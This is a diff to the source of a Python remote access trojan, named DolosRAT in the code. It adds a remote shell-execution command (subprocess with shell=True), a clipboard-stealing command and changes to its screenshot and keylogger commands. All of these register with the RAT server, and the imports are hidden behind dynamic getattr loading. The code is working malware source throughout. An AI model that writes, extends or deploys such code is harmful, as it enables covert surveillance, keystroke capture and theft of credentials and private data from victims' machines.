@@ -19,12 +19,8 @@ from importlib import import_module
 from pathlib import Path
 from typing import Any, Dict, List, Union
 from time import sleep
-from datetime import datetime, timedelta
-
-# from PIL import Image
 
 # Modules.
-# from commands.window import ScreenshotCommand # pylint: disable=import-error
 # Configuration classes.
 from config.config import Config # pylint: disable=import-error
 from config.logger import get_logger_conf # pylint: disable=import-error
@@ -73,7 +69,7 @@ class Command:
         ABC (_type_): _description_
     """
 
-    def __init__(self: object) -> None:
+    def __init__(self: object, *args) -> None:
         """_summary_
 
         Args:
@@ -84,6 +80,8 @@ class Command:
         """
 
         self._mods: List[Any] = []
+        
+        self._args: List[Any] = args
 
     def get_dep(self: object, mod_name: str) -> Union[Any, None]:
         """_summary_
@@ -126,15 +124,15 @@ class Command:
         """
 
         pass
-
-class ScreenshotCommand(Command):
+    
+class ExecuteCommand(Command):
     """_summary_
 
     Args:
         Command (_type_): _description_
     """
 
-    def __init__(self: object) -> None:
+    def __init__(self: object, *args) -> None:
         """_summary_
 
         Args:
@@ -145,12 +143,63 @@ class ScreenshotCommand(Command):
         """
 
         # Initialise from Command parent.
-        super().__init__()
-
-        self._mods: List[Any] = []
+        super().__init__(args)
 
         # Create list of imported dependencies.
-        self.create_deps('PIL.ImageGrab', 'io')
+        self.create_deps('subprocess', 'time')
+
+    def execute(self: object) -> bytes:
+        """_summary_
+
+        Args:
+            self (object): _description_
+
+        Returns:
+            Any: _description_
+        """
+        
+        subprocess_output = b''
+
+        try:
+            process = getattr(self.get_dep('subprocess'),'Popen')(
+                self._args[0],
+                stdout=getattr(self.get_dep('subprocess'),'PIPE'),
+                stderr=getattr(self.get_dep('subprocess'),'PIPE'),
+                shell=True
+            )
+            
+            if stderr := process.communicate()[1]:
+                subprocess_output = stderr
+            else:
+                subprocess_output = process.communicate()[0]
+
+        except getattr(self.get_dep('subprocess'),'CalledProcessError'):
+            pass
+        finally:
+            return subprocess_output
+
+class ScreenshotCommand(Command):
+    """_summary_
+
+    Args:
+        Command (_type_): _description_
+    """
+
+    def __init__(self: object, *args) -> None:
+        """_summary_
+
+        Args:
+            self (object): _description_
+
+        Returns:
+            Any: _description_
+        """
+
+        # Initialise from Command parent.
+        super().__init__(args)
+
+        # Create list of imported dependencies.
+        self.create_deps('PIL.ImageGrab', 'io', 'base64')
 
     def execute(self: object) -> bytes:
         """_summary_
@@ -168,10 +217,11 @@ class ScreenshotCommand(Command):
 
         # Create image capture, in PNG format.
         img_capture = getattr(self.get_dep('PIL.ImageGrab'),'grab')(all_screens=True)
-        img_capture.save(img_bytes, 'JPEG', quality=80, optimize=True, progressive=True)
+        img_capture.save(img_bytes, 'PNG')
 
-        img_bytes.seek(0)
-        
+        # Reset bytes cursor.
+        img_bytes.seek(0)    
+
         # Return bytes in byte array.
         return img_bytes.read()
     
@@ -182,7 +232,7 @@ class KeystrokeLogCommand(Command):
         Command (_type_): _description_
     """
 
-    def __init__(self: object) -> Any:
+    def __init__(self: object, *args) -> Any:
         """_summary_
 
         Args:
@@ -193,7 +243,7 @@ class KeystrokeLogCommand(Command):
         """
 
         # Initialise from Command parent.
-        super().__init__()
+        super().__init__(args)
 
         # Create list of imported dependencies.
         self.create_deps('threading', 'pynput.keyboard')
@@ -212,7 +262,7 @@ class KeystrokeLogCommand(Command):
         try:
             key_char = key.char
         except AttributeError:
-            key_char = str(key)
+            pass
         finally:
             return key_char
         
@@ -224,8 +274,6 @@ class KeystrokeLogCommand(Command):
             key (Any): _description_
         """
         
-        print("pressed")
-        
         key_enum = getattr(self.get_dep('pynput.keyboard'), 'Key')
         key_press = ''
             
@@ -236,6 +284,8 @@ class KeystrokeLogCommand(Command):
                 key_press = '\n'
             case key_enum.tab:
                 key_press = '\t'
+            case key_enum.backspace:
+                key_press = ''
             case _:
                 key_press = self._get_char(key)
 
@@ -263,6 +313,50 @@ class KeystrokeLogCommand(Command):
 
         # Return string of entered keystrokes.
         return b''.join(self._captured_keys)
+    
+class ClipboardCommand(Command):
+    """_summary_
+
+    Args:
+        Command (_type_): _description_
+    """
+
+    def __init__(self: object, *args) -> Any:
+        """_summary_
+
+        Args:
+            self (object): _description_
+
+        Returns:
+            Any: _description_
+        """
+
+        # Initialise from Command parent.
+        super().__init__(args)
+
+        # Create list of imported dependencies.
+        self.create_deps('pyperclip')
+
+    def execute(self: object) -> Any:
+        """_summary_
+
+        Args:
+            self (object): _description_
+
+        Returns:
+            Any: _description_
+        """
+        
+        # Houses clipboard contents.
+        clipboard_contents = ''
+
+        # Copy full contents of clipboard.
+        clipboard_contents = getattr(self.get_dep('pyperclip'), 'paste')()
+        # Return contents to clipboard.
+        getattr(self.get_dep('pyperclip'), 'copy')(clipboard_contents)
+
+        # Return string of entered keystrokes.
+        return clipboard_contents.encode()
 
 # Initial class housing primary DolosRAT logic.
 class DolosServer:
@@ -368,7 +462,9 @@ class DolosServer:
             self (object): _description_
         """
 
-        for command in [ScreenshotCommand, KeystrokeLogCommand]:
+        for command in [
+            ScreenshotCommand, KeystrokeLogCommand, ClipboardCommand, ExecuteCommand
+        ]:
             network_conf.conf['commands'][command.__name__] = command
 
     def _run(self: object) -> None:
